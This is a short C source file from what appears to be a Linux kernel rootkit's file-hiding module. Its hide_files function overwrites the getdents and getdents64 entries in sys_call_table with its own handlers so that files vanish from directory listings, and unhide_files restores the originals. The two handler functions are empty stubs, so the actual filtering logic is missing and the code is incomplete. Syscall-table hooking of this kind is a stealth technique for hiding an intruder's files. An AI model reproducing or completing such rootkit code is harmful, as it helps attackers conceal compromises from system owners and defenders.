#include "filehide.h"
#include "hook.h"

long
g7_getdents(unsigned fd, struct linux_dirent __user *dirp, unsigned count)
{

}

long
g7_getdents64(unsigned fd, struct linux_dirent64 __user *dirp, unsigned count)
{

}

void
hide_files(void)
{
    sys_call_table[__NR_getdents] = (long *)g7_getdents;
    sys_call_table[__NR_getdents64] = (long *)g7_getdents64;
}

void
unhide_files(void)
{
    sys_call_table[__NR_getdents] = (long *)sys_getdents;
    sys_call_table[__NR_getdents64] = (long *)sys_getdents64;
}
